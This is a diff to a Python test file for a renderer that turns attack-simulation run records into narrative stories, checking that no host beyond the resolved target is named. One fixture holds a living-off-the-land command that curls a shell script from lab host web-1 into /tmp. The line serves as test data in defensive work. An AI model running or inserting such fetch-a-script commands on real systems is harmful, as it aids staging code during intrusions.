@@ -127,19 +127,50 @@ def test_the_catalog_description_is_not_rendered():
     assert "db-1" in story
 
 
+def _renderer_prose(meta: dict) -> str:
+    """The story minus every block quoted verbatim from the runner record.
+
+    The leak this file guards is the RENDERER inserting a host the run did not touch —
+    the catalog `description` naming a scenario's default target, which retired two
+    cases. A host inside a `cmd` or its output is the opposite: it is what actually ran,
+    and censoring it would hide the operation from the oracle.
+
+    `living-off-the-land` is the case that forces the distinction. Its target resolves to
+    canary-1 and its command is `curl -fsS http://web-1/`, so `web-1` appears in the
+    story and must — a sweep over the raw text calls that a second target and is wrong.
+    """
+    prose = STORY.render_story(meta)
+    for step in meta.get("steps") or []:
+        for verbatim in (step.get("cmd"), step.get("stdout_tail"), step.get("stderr_tail")):
+            for line in (verbatim or "").splitlines():
+                if line.strip():
+                    prose = prose.replace(line.strip(), "")
+    return prose
+
+
 @pytest.mark.parametrize("meta_path", RUN_RECORDS, ids=lambda p: p.parent.name)
 def test_no_checked_in_record_renders_a_second_target(meta_path):
-    """Whatever else a story says, the only host it may name as the target is the
-    one the runner resolved."""
+    """Whatever else a story says, the only host the RENDERER may name as the target is
+    the one the runner resolved. Quoted command text is exempt — see `_renderer_prose`."""
     meta = json.loads(meta_path.read_text(encoding="utf-8"))
     target = (meta.get("resolved") or {}).get("target_host")
     if not target:
         pytest.skip("record carries no resolved target")
-    story = STORY.render_story(meta)
+    prose = _renderer_prose(meta)
     others = {s.get("source_host") for s in meta.get("steps") or []} - {None}
     hosts = {"canary-1", "db-1", "web-1", "web-2", "jump-box-1",
              "dev-ws-1", "office-ws-1", "office-ws-2"}
-    named = {h for h in hosts if h in story}
+    named = {h for h in hosts if h in prose}
     assert named <= ({target} | others), (
-        f"story names hosts beyond the resolved target and its sources: "
+        f"the renderer names hosts beyond the resolved target and its sources: "
         f"{sorted(named - ({target} | others))}")
+
+
+def test_a_host_named_only_inside_a_command_is_not_a_second_target():
+    """The exemption has to be real: `living-off-the-land` curls web-1 from canary-1, so
+    web-1 belongs in the story as evidence and not as a target claim."""
+    meta = {**META, "resolved": {"source_user": "root", "target_host": "canary-1"},
+            "steps": [{**META["steps"][0], "source_host": "canary-1",
+                       "cmd": "curl -fsS http://web-1/ -o /tmp/f.sh"}]}
+    assert "web-1" in STORY.render_story(meta), "the command must be shown verbatim"
+    assert "web-1" not in _renderer_prose(meta), "but it is not a target claim"
